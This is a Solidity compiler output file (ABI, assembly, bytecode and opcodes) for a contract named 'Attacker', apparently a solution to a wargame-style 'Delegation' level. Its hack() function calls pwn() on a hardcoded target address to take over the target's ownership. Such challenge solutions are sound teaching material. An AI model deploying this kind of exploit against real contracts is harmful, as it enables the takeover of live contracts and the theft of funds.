{
	"tests/test06.sol": {
		"Attacker": {
			"abi": [
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"tests/test06.sol\":84:395  contract Attacker... */\n  mstore(0x40, 0x80)\n    /* \"tests/test06.sol\":140:182  0x9195EE144c2Fbd6B3EBC0FC085fe4769e214a542 */\n  0x9195ee144c2fbd6b3ebc0fc085fe4769e214a542\n    /* \"tests/test06.sol\":108:183  Delegation level06 = Delegation(0x9195EE144c2Fbd6B3EBC0FC085fe4769e214a542) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"tests/test06.sol\":207:217  msg.sender */\n  caller\n    /* \"tests/test06.sol\":189:217  address myOwner = msg.sender */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"tests/test06.sol\":84:395  contract Attacker... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"tests/test06.sol\":84:395  contract Attacker... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"tests/test06.sol\":224:393  function hack() external... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"tests/test06.sol\":264:276  bool success */\n      0x00\n        /* \"tests/test06.sol\":290:297  level06 */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test06.sol\":282:303  address(level06).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"tests/test06.sol\":304:336  abi.encodeWithSignature(\"pwn()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xdd365b8b00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"tests/test06.sol\":282:337  address(level06).call(abi.encodeWithSignature(\"pwn()\")) */\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_11\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_10)\n    tag_11:\n      0x60\n      swap2\n      pop\n    tag_10:\n      pop\n        /* \"tests/test06.sol\":263:337  (bool success, ) = address(level06).call(abi.encodeWithSignature(\"pwn()\")) */\n      pop\n      swap1\n      pop\n        /* \"tests/test06.sol\":355:362  success */\n      dup1\n        /* \"tests/test06.sol\":347:386  require(success, \"call not successful\") */\n      tag_12\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_13\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_12:\n        /* \"tests/test06.sol\":253:393  {... */\n      pop\n        /* \"tests/test06.sol\":224:393  function hack() external... */\n      jump\t// out\n        /* \"#utility.yul\":7:105   */\n    tag_15:\n        /* \"#utility.yul\":58:64   */\n      0x00\n        /* \"#utility.yul\":92:97   */\n      dup2\n        /* \"#utility.yul\":86:98   */\n      mload\n        /* \"#utility.yul\":76:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:105   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":111:258   */\n    tag_16:\n        /* \"#utility.yul\":212:223   */\n      0x00\n        /* \"#utility.yul\":249:252   */\n      dup2\n        /* \"#utility.yul\":234:252   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:258   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":264:510   */\n    tag_17:\n        /* \"#utility.yul\":345:346   */\n      0x00\n        /* \"#utility.yul\":355:468   */\n    tag_26:\n        /* \"#utility.yul\":369:375   */\n      dup4\n        /* \"#utility.yul\":366:367   */\n      dup2\n        /* \"#utility.yul\":363:376   */\n      lt\n        /* \"#utility.yul\":355:468   */\n      iszero\n      tag_28\n      jumpi\n        /* \"#utility.yul\":454:455   */\n      dup1\n        /* \"#utility.yul\":449:452   */\n      dup3\n        /* \"#utility.yul\":445:456   */\n      add\n        /* \"#utility.yul\":439:457   */\n      mload\n        /* \"#utility.yul\":435:436   */\n      dup2\n        /* \"#utility.yul\":430:433   */\n      dup5\n        /* \"#utility.yul\":426:437   */\n      add\n        /* \"#utility.yul\":419:458   */\n      mstore\n        /* \"#utility.yul\":391:393   */\n      0x20\n        /* \"#utility.yul\":388:389   */\n      dup2\n        /* \"#utility.yul\":384:394   */\n      add\n        /* \"#utility.yul\":379:394   */\n      swap1\n      pop\n        /* \"#utility.yul\":355:468   */\n      jump(tag_26)\n    tag_28:\n        /* \"#utility.yul\":502:503   */\n      0x00\n        /* \"#utility.yul\":493:499   */\n      dup5\n        /* \"#utility.yul\":488:491   */\n      dup5\n        /* \"#utility.yul\":484:500   */\n      add\n        /* \"#utility.yul\":477:504   */\n      mstore\n        /* \"#utility.yul\":326:510   */\n      pop\n        /* \"#utility.yul\":264:510   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":516:902   */\n    tag_18:\n        /* \"#utility.yul\":620:623   */\n      0x00\n        /* \"#utility.yul\":648:686   */\n      tag_30\n        /* \"#utility.yul\":680:685   */\n      dup3\n        /* \"#utility.yul\":648:686   */\n      tag_15\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":702:790   */\n      tag_31\n        /* \"#utility.yul\":783:789   */\n      dup2\n        /* \"#utility.yul\":778:781   */\n      dup6\n        /* \"#utility.yul\":702:790   */\n      tag_16\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":695:790   */\n      swap4\n      pop\n        /* \"#utility.yul\":799:864   */\n      tag_32\n        /* \"#utility.yul\":857:863   */\n      dup2\n        /* \"#utility.yul\":852:855   */\n      dup6\n        /* \"#utility.yul\":845:849   */\n      0x20\n        /* \"#utility.yul\":838:843   */\n      dup7\n        /* \"#utility.yul\":834:850   */\n      add\n        /* \"#utility.yul\":799:864   */\n      tag_17\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":889:895   */\n      dup1\n        /* \"#utility.yul\":884:887   */\n      dup5\n        /* \"#utility.yul\":880:896   */\n      add\n        /* \"#utility.yul\":873:896   */\n      swap2\n      pop\n        /* \"#utility.yul\":624:902   */\n      pop\n        /* \"#utility.yul\":516:902   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":908:1179   */\n    tag_8:\n        /* \"#utility.yul\":1038:1041   */\n      0x00\n        /* \"#utility.yul\":1060:1153   */\n      tag_34\n        /* \"#utility.yul\":1149:1152   */\n      dup3\n        /* \"#utility.yul\":1140:1146   */\n      dup5\n        /* \"#utility.yul\":1060:1153   */\n      tag_18\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":1053:1153   */\n      swap2\n      pop\n        /* \"#utility.yul\":1170:1173   */\n      dup2\n        /* \"#utility.yul\":1163:1173   */\n      swap1\n      pop\n        /* \"#utility.yul\":908:1179   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1185:1354   */\n    tag_19:\n        /* \"#utility.yul\":1269:1280   */\n      0x00\n        /* \"#utility.yul\":1303:1309   */\n      dup3\n        /* \"#utility.yul\":1298:1301   */\n      dup3\n        /* \"#utility.yul\":1291:1310   */\n      mstore\n        /* \"#utility.yul\":1343:1347   */\n      0x20\n        /* \"#utility.yul\":1338:1341   */\n      dup3\n        /* \"#utility.yul\":1334:1348   */\n      add\n        /* \"#utility.yul\":1319:1348   */\n      swap1\n      pop\n        /* \"#utility.yul\":1185:1354   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1360:1529   */\n    tag_20:\n        /* \"#utility.yul\":1500:1521   */\n      0x63616c6c206e6f74207375636365737366756c00000000000000000000000000\n        /* \"#utility.yul\":1496:1497   */\n      0x00\n        /* \"#utility.yul\":1488:1494   */\n      dup3\n        /* \"#utility.yul\":1484:1498   */\n      add\n        /* \"#utility.yul\":1477:1522   */\n      mstore\n        /* \"#utility.yul\":1360:1529   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1535:1901   */\n    tag_21:\n        /* \"#utility.yul\":1677:1680   */\n      0x00\n        /* \"#utility.yul\":1698:1765   */\n      tag_38\n        /* \"#utility.yul\":1762:1764   */\n      0x13\n        /* \"#utility.yul\":1757:1760   */\n      dup4\n        /* \"#utility.yul\":1698:1765   */\n      tag_19\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":1691:1765   */\n      swap2\n      pop\n        /* \"#utility.yul\":1774:1867   */\n      tag_39\n        /* \"#utility.yul\":1863:1866   */\n      dup3\n        /* \"#utility.yul\":1774:1867   */\n      tag_20\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":1892:1894   */\n      0x20\n        /* \"#utility.yul\":1887:1890   */\n      dup3\n        /* \"#utility.yul\":1883:1895   */\n      add\n        /* \"#utility.yul\":1876:1895   */\n      swap1\n      pop\n        /* \"#utility.yul\":1535:1901   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1907:2326   */\n    tag_14:\n        /* \"#utility.yul\":2073:2077   */\n      0x00\n        /* \"#utility.yul\":2111:2113   */\n      0x20\n        /* \"#utility.yul\":2100:2109   */\n      dup3\n        /* \"#utility.yul\":2096:2114   */\n      add\n        /* \"#utility.yul\":2088:2114   */\n      swap1\n      pop\n        /* \"#utility.yul\":2160:2169   */\n      dup2\n        /* \"#utility.yul\":2154:2158   */\n      dup2\n        /* \"#utility.yul\":2150:2170   */\n      sub\n        /* \"#utility.yul\":2146:2147   */\n      0x00\n        /* \"#utility.yul\":2135:2144   */\n      dup4\n        /* \"#utility.yul\":2131:2148   */\n      add\n        /* \"#utility.yul\":2124:2171   */\n      mstore\n        /* \"#utility.yul\":2188:2319   */\n      tag_41\n        /* \"#utility.yul\":2314:2318   */\n      dup2\n        /* \"#utility.yul\":2188:2319   */\n      tag_21\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":2180:2319   */\n      swap1\n      pop\n        /* \"#utility.yul\":1907:2326   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220eaa221a4c8e98ed06e6f15706e34b844c39ec75e2bc8a4b64f9376e911dee3f064736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052739195ee144c2fbd6b3ebc0fc085fe4769e214a5425f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100a2575f80fd5b506102b4806100b05f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c80634de260a21461002d575b5f80fd5b610035610037565b005b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516100ff91906101f0565b5f604051808303815f865af19150503d805f8114610138576040519150601f19603f3d011682016040523d82523d5f602084013e61013d565b606091505b5050905080610181576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017890610260565b60405180910390fd5b50565b5f81519050919050565b5f81905092915050565b5f5b838110156101b557808201518184015260208101905061019a565b5f8484015250505050565b5f6101ca82610184565b6101d4818561018e565b93506101e4818560208601610198565b80840191505092915050565b5f6101fb82846101c0565b915081905092915050565b5f82825260208201905092915050565b7f63616c6c206e6f74207375636365737366756c000000000000000000000000005f82015250565b5f61024a601383610206565b915061025582610216565b602082019050919050565b5f6020820190508181035f8301526102778161023e565b905091905056fea2646970667358221220eaa221a4c8e98ed06e6f15706e34b844c39ec75e2bc8a4b64f9376e911dee3f064736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x9195EE144C2FBD6B3EBC0FC085FE4769E214A542 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0xA2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x2B4 DUP1 PUSH2 0xB0 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xDD365B8B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0xFF SWAP2 SWAP1 PUSH2 0x1F0 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x138 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x13D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x181 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x178 SWAP1 PUSH2 0x260 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1B5 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x19A JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x1CA DUP3 PUSH2 0x184 JUMP JUMPDEST PUSH2 0x1D4 DUP2 DUP6 PUSH2 0x18E JUMP JUMPDEST SWAP4 POP PUSH2 0x1E4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x198 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x1FB DUP3 DUP5 PUSH2 0x1C0 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x63616C6C206E6F74207375636365737366756C00000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x24A PUSH1 0x13 DUP4 PUSH2 0x206 JUMP JUMPDEST SWAP2 POP PUSH2 0x255 DUP3 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x277 DUP2 PUSH2 0x23E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEA LOG2 0x21 LOG4 0xC8 0xE9 DUP15 0xD0 PUSH15 0x6F15706E34B844C39EC75E2BC8A4B6 0x4F SWAP4 PUSH23 0xE911DEE3F064736F6C6343000818003300000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "138400",
						"executionCost": "48712",
						"totalCost": "187112"
					},
					"external": {
						"hack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 75,
						"contract": "tests/test06.sol:Attacker",
						"label": "level06",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Delegation)66"
					},
					{
						"astId": 79,
						"contract": "tests/test06.sol:Attacker",
						"label": "myOwner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(Delegation)66": {
						"encoding": "inplace",
						"label": "contract Delegation",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}